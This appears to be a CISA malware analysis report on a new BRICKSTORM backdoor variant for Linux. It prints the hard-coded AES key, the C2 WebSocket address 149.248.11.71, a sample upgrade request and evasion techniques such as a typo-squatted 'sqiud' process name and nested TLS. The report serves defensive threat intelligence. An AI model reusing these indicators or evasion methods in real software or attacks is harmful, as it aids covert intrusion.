objects.name: 24a11a26a2586f4fba7bfe89df2e21a0809ad85069e442da98c37c4add369a0c
objects.description:
This sample is a 64-bit Linux ELF file built from a .NET application using Native AOT compilation. The .NET Native AOT binary requires no runtime to be installed and all its dependencies statically linked together, including the runtime itself. The binary has been identified as a new variant of the backdoor named BRICKSTORM that uses several advanced techniques to evade detection. The backdoor uses SOCKS4/5, HTTP/HTTPS proxies, multi-layered web service communication, and varied command execution to obscure its activities. 

Upon execution, the backdoor performs environmental checks, including loading system libraries, configuring memory safety, and managing thread/signals. The backdoor utilizes OpenSSL's libcrypto to decrypt internal configuration data that contains a WebSocket address using Advanced Encryption Standard (AES). The decryption process relies on the hard-coded key "215101213b5c4548ab6cce81854a13ee".

Displayed below is the decrypted internal configuration data:

--Begin Configuration--
"wss://149.248.11.71/rest/apisession" ==> WebSocket address
--End Configuration--

Upon execution, the backdoor initiates a function to configure environment variables. The backdoor then checks for the "DAEMONIZED" environment variable to determine if it is running as a child process. If "DAEMONIZED" is not set (indicating not a child process), the backdoor verifies its current execution path, creates a new background session and spawns a child process to continue its execution while the initial parent process terminates. The backdoor changes its visible process name to "/usr/sbin/sqiud" and re-executes itself under the newly named "sqiud". The backdoor's new process name "sqiud" is hard-coded and is a deliberate typo of the legitimate "squid" proxy service. The backdoor attempts to open "/dev/null" and redirect the child process's standard input, standard output, and standard error streams to it to prevent the background process from generating terminal output or waiting for input, which is standard behavior for a daemon.

The backdoor employs a multi-layered encryption and multiplexing strategy to conceal its Command-and-Control (C2) traffic. The backdoor initiates a connection to "149.248.11.71" (a Vultr Holdings Internet Protocol (IP) address) over port 443. The backdoor uses an HTTP "Upgrade" header to convert the HTTPS connection into a persistent WebSocket session via the "/rest/apisession" endpoint. Within the outer WebSocket connection, the backdoor establishes a second, independent Transport Layer Security (TLS) handshake. This "nested" encryption hides the true payload from security solutions that only terminate or inspect the outer Secure Sockets Layer (SSL)/TLS layer. During the inner TLS handshake, the backdoor authenticates itself to the C2 server using a key derived from a hard-coded string. The string has been redacted from this report. The backdoor uses the .NET "Nerdbank.Streams" library, specifically the MultiplexingStream class, to manage multiple independent channels or sub-streams within the single inner encrypted connection. 

Displayed below are sample upgrade connection requests to a WebSockets protocol:

--Begin Decrypted WebSocket Connection--
GET /rest/apisession HTTP/1.1
Host: 149.248.11.71
X-WS-TOKEN: SE
Connection: Upgrade
Upgrade: websocket
Sec-WebSocket-Key: Btnk6ewWUUesu1d0/ZBQqA==
Sec-WebSocket-Version: 13

HTTP/1.1 101 Switching Protocols
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Accept: e+jsQqvqiJ0BwKqfYpaCpIR4+2U=
Date: Mon, 19 Jan 2026 13:43:26 GMT
Server: Python/3.8 websockets/13.1
--End Decrypted WebSocket Connection--

Once the connection is established with the C2 server via WebSockets, the backdoor accepts web-based commands via its WebSocket C2 communication channel to perform various tasks, including arbitrary command execution (interactive pseudo-terminal (PTY) sessions and simple command execution), file operations, and proxy relaying (SOCKS4/5 and HTTP/HTTPS proxies).

objects.description: CISA received one 64-bit Executable and Linkable Format (ELF) files for analysis. The file is a compiled .NET Native Ahead-Of-Time (AOT) binary that has been identified as a new variant of the BRICKSTORM backdoor malware that uses SOCKS4/5, Hypertext Transfer Protocol (HTTP) and Hypertext Transfer Protocol Secure (HTTPS) proxies, multi-layered web service communication, and varied command execution to obscure its activities.
